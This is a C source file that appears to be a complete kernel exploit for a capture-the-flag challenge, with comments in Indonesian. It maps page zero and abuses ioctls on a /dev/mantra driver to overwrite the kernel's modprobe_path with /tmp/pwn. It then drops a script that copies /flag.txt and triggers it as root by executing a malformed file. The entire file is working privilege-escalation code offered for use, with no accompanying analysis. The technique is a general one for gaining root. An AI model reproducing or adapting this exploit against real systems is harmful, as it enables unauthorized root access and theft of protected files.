#define SYS_read 0
#define SYS_write 1
#define SYS_open 2
#define SYS_close 3
#define SYS_mmap 9
#define SYS_ioctl 16
#define SYS_fork 57
#define SYS_execve 59
#define SYS_wait4 61
#define SYS_exit 60

static long sc0(long n) {
  long r;
  __asm__ volatile("syscall" : "=a"(r) : "a"(n) : "rcx", "r11", "memory");
  return r;
}

static long sc1(long n, long a1) {
  long r;
  __asm__ volatile("syscall"
                   : "=a"(r)
                   : "a"(n), "D"(a1)
                   : "rcx", "r11", "memory");
  return r;
}

static long sc2(long n, long a1, long a2) {
  long r;
  __asm__ volatile("syscall"
                   : "=a"(r)
                   : "a"(n), "D"(a1), "S"(a2)
                   : "rcx", "r11", "memory");
  return r;
}

static long sc3(long n, long a1, long a2, long a3) {
  long r;
  __asm__ volatile("syscall"
                   : "=a"(r)
                   : "a"(n), "D"(a1), "S"(a2), "d"(a3)
                   : "rcx", "r11", "memory");
  return r;
}

static long sc6(long n, long a1, long a2, long a3, long a4, long a5, long a6) {
  register long _a4 __asm__("r10") = a4;
  register long _a5 __asm__("r8") = a5;
  register long _a6 __asm__("r9") = a6;
  long r;
  __asm__ volatile("syscall"
                   : "=a"(r)
                   : "a"(n), "D"(a1), "S"(a2), "d"(a3), "r"(_a4), "r"(_a5),
                     "r"(_a6)
                   : "rcx", "r11", "memory");
  return r;
}

#define sys_mmap(addr, len, prot, flags, fd, off)                              \
  sc6(SYS_mmap, (long)(addr), (long)(len), (long)(prot), (long)(flags),        \
      (long)(fd), (long)(off))
#define sys_open(filename, flags, mode)                                        \
  sc3(SYS_open, (long)(filename), (long)(flags), (long)(mode))
#define sys_close(fd) sc1(SYS_close, (long)(fd))
#define sys_ioctl(fd, req, arg)                                                \
  sc3(SYS_ioctl, (long)(fd), (long)(req), (long)(arg))
#define sys_write(fd, buf, len)                                                \
  sc3(SYS_write, (long)(fd), (long)(buf), (long)(len))
#define sys_read(fd, buf, len)                                                 \
  sc3(SYS_read, (long)(fd), (long)(buf), (long)(len))
#define sys_execve(filename, argv, envp)                                       \
  sc3(SYS_execve, (long)(filename), (long)(argv), (long)(envp))
#define sys_exit(code) sc1(SYS_exit, (long)(code))

static void *hide_ptr(void *p) {
  void *out;
  __asm__ volatile("mov %1, %0" : "=r"(out) : "r"(p));
  return out;
}

void _start(void) {
  // 1. Buka device /dev/mantra (O_RDWR = 2)
  int fd = sys_open("/dev/mantra", 2, 0);
  if (fd < 0)
    sys_exit(1);

  // 2. Mmap halaman 0
  void *map = (void *)sys_mmap(0, 0x1000, 3, 0x32, -1, 0);
  if (map != 0)
    sys_exit(2);

  volatile unsigned long *fake = (volatile unsigned long *)hide_ptr((void *)0);
  char *key_buf = (char *)hide_ptr((void *)0x300);
  unsigned long *read_arg = (unsigned long *)hide_ptr((void *)0x100);
  char *old_path = (char *)hide_ptr((void *)0x200);

  fake[0] = (unsigned long)0x300;
  fake[1] = 9;
  fake[2] = 0xffffffff82b3f580; // modprobe_path
  fake[3] = 9;

  read_arg[0] = (unsigned long)0x200;
  read_arg[1] = 9;

  // 3. Baca modprobe_path asli
  long ret = sys_ioctl(fd, 0x4D13, (long)read_arg);
  if (ret < 0)
    sys_exit(3);

  char desired[9] = "/tmp/pwn";
  desired[8] = '\0';

  for (int i = 0; i < 9; i++) {
    key_buf[i] = old_path[i] ^ desired[i];
  }

  // 4. Timpa modprobe_path via XOR
  ret = sys_ioctl(fd, 0x4D14, 0);
  if (ret < 0)
    sys_exit(4);

  sys_write(1, "[+] modprobe_path overwritten successfully!\n", 43);

  // 5. Buat script /tmp/pwn (O_CREAT=0100 | O_WRONLY=01 | O_TRUNC=01000 = 577)
  const char *pwn_script =
      "#!/bin/sh\ncp /flag.txt /tmp/flag\nchmod 777 /tmp/flag\n";
  int pwn_len = 0;
  while (pwn_script[pwn_len])
    pwn_len++;

  int pfd = sys_open("/tmp/pwn", 577, 0777);
  if (pfd >= 0) {
    sys_write(pfd, pwn_script, pwn_len);
    sys_close(pfd);
  }

  // 6. Buat file dummy /tmp/dummy (4 byte \xff)
  const char *dummy_content = "\xff\xff\xff\xff";
  int dfd = sys_open("/tmp/dummy", 577, 0777);
  if (dfd >= 0) {
    sys_write(dfd, dummy_content, 4);
    sys_close(dfd);
  }

  // 7. Fork dan exec /tmp/dummy untuk memicu modprobe
  long pid = sc0(SYS_fork);
  if (pid == 0) {
    char *argv[] = {"/tmp/dummy", 0};
    char *envp[] = {0};
    sys_execve("/tmp/dummy", argv, envp);
    sys_exit(0);
  } else if (pid > 0) {
    long status;
    sc6(SYS_wait4, pid, (long)&status, 0, 0, 0, 0);
  }

  // 8. Baca dan print flag dari /tmp/flag
  int ffd = sys_open("/tmp/flag", 0, 0); // O_RDONLY = 0
  if (ffd >= 0) {
    char flag_buf[128];
    long n = sys_read(ffd, flag_buf, sizeof(flag_buf));
    if (n > 0) {
      sys_write(1, "\n=== FLAG OUTPUT ===\n", 21);
      sys_write(1, flag_buf, n);
      sys_write(1, "\n", 1);
    }
    sys_close(ffd);
  }

  sys_exit(0);
}